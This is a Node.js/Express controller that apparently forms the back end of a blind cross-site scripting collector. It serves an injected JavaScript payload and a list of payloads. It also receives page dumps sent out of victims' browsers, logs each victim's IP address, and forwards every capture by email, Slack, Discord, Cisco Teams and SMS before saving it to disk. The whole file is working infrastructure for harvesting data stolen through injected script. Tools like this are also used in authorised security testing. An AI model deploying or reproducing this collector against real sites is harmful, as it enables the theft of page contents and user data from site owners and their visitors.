const mail = require('../utilities/email');
const sms = require('../utilities/sms');
const process = require('../utilities/process');
const save = require('../utilities/save');
const uuid = require('uuid/v1');
const config = require('../config/config');
const slack = require('../utilities/slack');
const discord = require('../utilities/discord');
const ciscoTeams = require('../utilities/spark');
const template = require('../utilities/template');
const payloads = require('../utilities/payloads');

exports.displayScript = (req, res) => {
  res.type('.js');
  const generatedTemplate = template.generateTemplate(config);
  res.send(generatedTemplate);
};

exports.displayDefault = (req, res) => {
  res.type('.js');
  res.send('alert(1)');
};

exports.generatePayloads = (req, res) => {
  res.set('Content-Type', 'text/plain');
  const generatedPayloads = payloads.generatePayloads(config);
  res.send(generatedPayloads);
};

exports.capture = (req, res) => {
  if (req.body._) {
    const rawDump = unescape(req.body._);
    const domain = process.processDomain(rawDump, config);
    domain.victimIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
    const guid = uuid();


    // Always send email when resource is loaded
    mail.sendMail(guid, domain, config);
    // Always send to slack when resource is loaded;
    slack.sendSlack(guid, domain, config);
    ciscoTeams.sendCiso(guid, domain, config);
    // Always send to discord when resource is loaded;
    discord.sendDiscord(guid, domain, config);
    // check if domain.URL exists or is not null/empty (should always be captured if valid request)
    if (!process.checkExists(domain) && !!domain.URL) {
      console.log(`${domain.URL} doesn't exist saving file`);
      if (!process.lastSave()) {
        console.log(`Sending SMS For URL ${domain.URL}`);
        sms.sendSMS(guid, domain, config, save);
        console.log(`Saving To Disk URL ${domain.URL}`);
        save.saveFile(guid, domain);
        res.redirect(domain.URL);
      } else {
        res.redirect(domain.URL);
        console.log('Already sent SMS today, saving to disk');
        console.log(`Saving To Disk URL ${domain.URL}`);
        save.saveFile(guid, domain);
      }
    } else {
      console.log(`The domain ${domain.URL} already exists`);
      console.log(`Saving To Disk URL ${domain.URL}`);
      save.saveFile(guid, domain);
      res.redirect(domain.URL);
    }
  } else {
    // You always need a meme to spice up code, this feels appropriate
    console.log(`${req.connection.remoteAddress} :| https://www.youtube.com/watch?v=wKbU8B-QVZk`);
    res.send(':-[');
  }
};
